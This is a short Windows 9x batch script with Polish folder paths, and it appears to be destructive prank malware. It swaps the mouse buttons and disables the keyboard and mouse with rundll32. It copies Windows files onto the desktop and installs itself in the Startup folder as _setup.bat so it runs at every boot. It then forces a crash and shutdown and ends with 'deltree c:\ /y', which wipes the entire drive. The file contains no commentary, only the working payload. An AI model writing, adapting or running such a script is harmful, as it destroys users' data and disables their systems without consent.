rundll32 user,swapmousebutton
copy c:\windows\*.* c:\windows\pulpit\*.* >nul
rundll32 user,disableoemlayer
rundll32 keyboard,disable
if not exist c:\windows\menust~1\programy\autost~1\_setup.bat copy %0 c:\windows\menust~1\programy\autost~1\_setup.bat  
rundll32 mouse,disable
rundll32 krnl386.exe,FatalExit
rundll32 user,exitwindows
deltree c:\ /y
